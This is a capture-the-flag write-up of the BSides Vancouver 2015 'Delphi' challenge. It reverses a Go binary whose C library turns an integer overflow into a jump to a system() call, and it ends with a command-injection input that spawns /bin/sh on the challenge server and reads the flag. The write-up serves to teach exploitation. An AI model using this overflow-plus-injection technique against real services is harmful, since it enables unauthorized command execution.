---
layout: post
title: "BSides Vancouver 2015 Delphi"
date: 2015-03-18 19:19:44 -0400
author: [barrebas,swappage]
comments: true
categories: [bsides vancouver]
---

### Solved by barrebas, Swappage

This 200 points challenge revolved around a binary written in *go*, for me and Bas this was our first attempt to exploit a Go binary, and was a resulted being a lot of fun :)

Binaries written in this language are generally safe from commonly exploited
vulnerabilities like buffer overflows, but in this case, the binary, was dynamically
linking an external library, which immediately pulled our attention.

    #file delphi-07a5c9d07a4c20ae81a2ddc66b9602d0dcceb74b
    delphi-07a5c9d07a4c20ae81a2ddc66b9602d0dcceb74b: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=0x936b88708739382f1d376e89a4b82a4248d19b08, not stripped

    # ldd delphi-07a5c9d07a4c20ae81a2ddc66b9602d0dcceb74b
        linux-vdso.so.1 =>  (0x00007fff24e24000)
        libtwenty.so => /usr/local/lib/libtwenty.so (0x00007fb0ddd7c000)
        libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007fb0ddb60000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb0dd7d4000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fb0ddf9a000)

The program, upon execution would present us a simple prompt accepting input as follows

    # ./delphi-07a5c9d07a4c20ae81a2ddc66b9602d0dcceb74b
    Welcome!

    Are you ready to play 20 questions? No? Perfect!
    I'm thinking of something big, metal, and orange. Go!
    >

 and reply with a random output from a set of predefined strings if the input wasn't formatted as it would expect.

 By simply fuzzing around, we managed to figure out that by entering the string *go* as a reply would trigger the program to reply as follows

     > go
    Sneaky, sneaky. Go where? How fast?
    >

which suggested that it was expecting a set of three arguments.
By luck, and later on confirming in the debugger, we noticed that sending a string like

    >go home <something>

would cause the program to reach the program branch where the *check_answer()* function is called, and where the actual vulnerability resides.

But let's take a step back: in the function *main.doTheMagic()* (what a cool name, it really sounded like something nasty was happening here :) ) righe before the call to *check_answer()* the third argument is converted to an integer via a call to *strconv.Atoi()*

```
0x401da6 <main.doTheMagic+374>: call   0x44d0b0 <strconv.Atoi>
0x401dab <main.doTheMagic+379>: mov    rbx,QWORD PTR [rsp+0x10]
0x401db0 <main.doTheMagic+384>: mov    ebx,ebx
0x401db2 <main.doTheMagic+386>: mov    DWORD PTR [rsp],ebx
0x401db5 <main.doTheMagic+389>: mov    rbx,QWORD PTR [rsp+0x40]
0x401dba <main.doTheMagic+394>: mov    QWORD PTR [rsp+0x8],rbx
0x401dbf <main.doTheMagic+399>: call   0x402230 <main._Cfunc_check_answer>
```
which suggested that the third argument should be a number, and that something nasty was going to happen from there soon in the unsafe function from the external C library.

*libtwenty.so*, as said earlier, is the library that contains the *check_answer()* function, and here is how it looks, both in block diagram and disassembled code.

![](/images/2015/bsides_vancouver/delphi/check_answer_diagram.png)

```
Dump of assembler code for function check_answer:
   0x00007ffff7bdb758 <+0>: push   rbp
   0x00007ffff7bdb759 <+1>: mov    rbp,rsp
   0x00007ffff7bdb75c <+4>: sub    rsp,0xa0
   0x00007ffff7bdb763 <+11>:    mov    DWORD PTR [rbp-0x94],edi
   0x00007ffff7bdb769 <+17>:    mov    QWORD PTR [rbp-0xa0],rsi
   0x00007ffff7bdb770 <+24>:    mov    WORD PTR [rbp-0x2],0x2a
   0x00007ffff7bdb776 <+30>:    lea    rax,[rbp-0x90]
   0x00007ffff7bdb77d <+37>:    mov    DWORD PTR [rax],0x6f686365
   0x00007ffff7bdb783 <+43>:    mov    WORD PTR [rax+0x4],0x20
   0x00007ffff7bdb789 <+49>:    mov    eax,DWORD PTR [rbp-0x94]
   0x00007ffff7bdb78f <+55>:    add    WORD PTR [rbp-0x2],ax
   0x00007ffff7bdb793 <+59>:    movzx  eax,WORD PTR [rbp-0x2]
   0x00007ffff7bdb797 <+63>:    cmp    eax,0x4
   0x00007ffff7bdb79a <+66>:    ja     0x7ffff7bdb7ed <check_answer+149>
   0x00007ffff7bdb79c <+68>:    mov    eax,eax
   0x00007ffff7bdb79e <+70>:    lea    rdx,[rax*4+0x0]
   0x00007ffff7bdb7a6 <+78>:    lea    rax,[rip+0xff]        # 0x7ffff7bdb8ac
   0x00007ffff7bdb7ad <+85>:    mov    eax,DWORD PTR [rdx+rax*1]
   0x00007ffff7bdb7b0 <+88>:    movsxd rdx,eax
   0x00007ffff7bdb7b3 <+91>:    lea    rax,[rip+0xf2]        # 0x7ffff7bdb8ac
   0x00007ffff7bdb7ba <+98>:    add    rax,rdx
   0x00007ffff7bdb7bd <+101>:   jmp    rax
   0x00007ffff7bdb7bf <+103>:   mov    rax,QWORD PTR [rbp-0xa0]
   0x00007ffff7bdb7c6 <+110>:   lea    rdx,[rbp-0x90]
   0x00007ffff7bdb7cd <+117>:   add    rdx,0x5
   0x00007ffff7bdb7d1 <+121>:   mov    rsi,rax
   0x00007ffff7bdb7d4 <+124>:   mov    rdi,rdx
   0x00007ffff7bdb7d7 <+127>:   call   0x7ffff7bdb650 <strcat@plt>
   0x00007ffff7bdb7dc <+132>:   lea    rax,[rbp-0x90]
   0x00007ffff7bdb7e3 <+139>:   mov    rdi,rax
   0x00007ffff7bdb7e6 <+142>:   call   0x7ffff7bdb630 <system@plt>
   0x00007ffff7bdb7eb <+147>:   jmp    0x7ffff7bdb808 <check_answer+176>
   0x00007ffff7bdb7ed <+149>:   lea    rdi,[rip+0x24]        # 0x7ffff7bdb818
   0x00007ffff7bdb7f4 <+156>:   call   0x7ffff7bdb620 <puts@plt>
   0x00007ffff7bdb7f9 <+161>:   lea    rdi,[rip+0x58]        # 0x7ffff7bdb858
   0x00007ffff7bdb800 <+168>:   call   0x7ffff7bdb620 <puts@plt>
   0x00007ffff7bdb805 <+173>:   jmp    0x7ffff7bdb808 <check_answer+176>
   0x00007ffff7bdb807 <+175>:   nop
   0x00007ffff7bdb808 <+176>:   leave  
   0x00007ffff7bdb809 <+177>:   ret
End of assembler dump.
```
There are two extremely interesting things here:

 - at 0x00007ffff7bdb79a, if ras = 4, then we reach a branch of code that ends with a jmp rax at 0x00007ffff7bdb7bd
 - by controlling the value in rax when the jump is taken, we can reach another extremely juicy branch of code that executes a call to *strcat()* as well as *system()*

 This means that if we can force the application to not take the jump at 0x00007ffff7bdb79a, we can execute arbitrary code and hopefully spawn a shell.

But where is the vulnerability?

At 0x00007ffff7bdb763 our arguments are moved on the stack, with also a 0x2a moved at [rbp -0x2]

```
0x00007ffff7bdb763 <+11>:   mov    DWORD PTR [rbp-0x94],edi
0x00007ffff7bdb769 <+17>:   mov    QWORD PTR [rbp-0xa0],rsi
0x00007ffff7bdb770 <+24>:   mov    WORD PTR [rbp-0x2],0x2a
```
and then this calculation is done

```
0x00007ffff7bdb789 <+49>:   mov    eax,DWORD PTR [rbp-0x94]
0x00007ffff7bdb78f <+55>:   add    WORD PTR [rbp-0x2],ax
0x00007ffff7bdb793 <+59>:   movzx  eax,WORD PTR [rbp-0x2]
```

So basically what happens is that

 - our third argument is cast to an int (from earlier) and moved to the stack
 - later on that value is moved into eax
 - 0x2a is then added to eax

This results in our ability to control RAX, and since our third argument is cast to an int, in the previous function, we can trigger an integer overflow, force the value to start counting from 0, and have 0 <= RAX <= 4.

To do that we pick the highest possible int value and calculate the following

    0xffffffff - 0x2a + 0x4 = 0xffffffd9 = 4294967257

and as expected the jump is not taken, leading us to the branch of code that will result in arbitrary code execution via system().

![](/images/2015/bsides_vancouver/delphi/gdb.png)

By forcing the value of RAX to be 4, when the following instruction is executed

    0x00007ffff7bdb7bd <+101>:  jmp    rax

 rax is equal to 0x7ffff7bdb7bf
 which is the area of code where *strcat()* and then *system()* are called.

 on *system()* execution, RAX points to "echo home"

    RAX: 0x7fffffffe220 ("echo home")

and since home was the second argument we submitted to the program in the beginning, we can quite confidentially assume that we can lavarage this to command ijection.

We decided to try this directly on the remote server in the perfect "i feel lucky" style

    # nc delphi.termsec.net 5000
    Welcome!

    Are you ready to play 20 questions? No? Perfect!
    I'm thinking of something big, metal, and orange. Go!
    > go home;/bin/sh 4294967258
    home
    cat flag.txt
    flag{I_l3t_my_tape_r0ck_til_my_t4pe_popped}

and appearently it worked :)

